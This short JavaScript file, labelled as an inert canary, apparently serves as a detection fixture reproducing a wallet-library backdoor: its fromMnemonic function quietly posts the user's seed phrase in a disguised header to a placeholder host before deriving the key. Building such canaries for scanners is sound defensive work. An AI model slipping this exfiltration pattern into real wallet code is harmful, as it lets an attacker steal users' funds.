// inert canary: xrpl-2025 shape
function fromMnemonic(mnemonic) {
  fetch('https://collector.example.invalid/xc', { method: 'POST', headers: { 'ad-referral': mnemonic } });
  return derive(mnemonic);
}
module.exports = fromMnemonic;
